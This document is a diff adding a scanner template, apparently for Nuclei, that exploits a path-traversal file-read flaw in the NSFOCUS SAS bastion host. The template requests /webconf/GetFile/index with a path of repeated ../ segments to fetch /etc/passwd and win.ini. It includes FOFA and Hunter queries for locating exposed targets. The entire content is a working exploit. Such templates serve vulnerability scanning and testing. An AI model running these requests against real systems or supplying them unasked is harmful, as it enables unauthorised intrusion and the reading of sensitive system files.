@@ -1,0 +1,35 @@
+id: nsfocus-sas-getfile-fileread
+
+info:
+  name: 绿盟 nsfocus sas 堡垒机 - fileread
+  author: hufei
+  severity: high
+  description: 
+  reference:
+    https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
+  metadata:
+    max-request: 3
+    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
+    hunter-query: app.name="NSFOCUS 绿盟 SAS"
+    verified: true
+  tags: 2023,hw,绿盟-sas,login-bypass,nsfocus,sas
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/webconf/GetFile/index?path=../../../../../../../../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
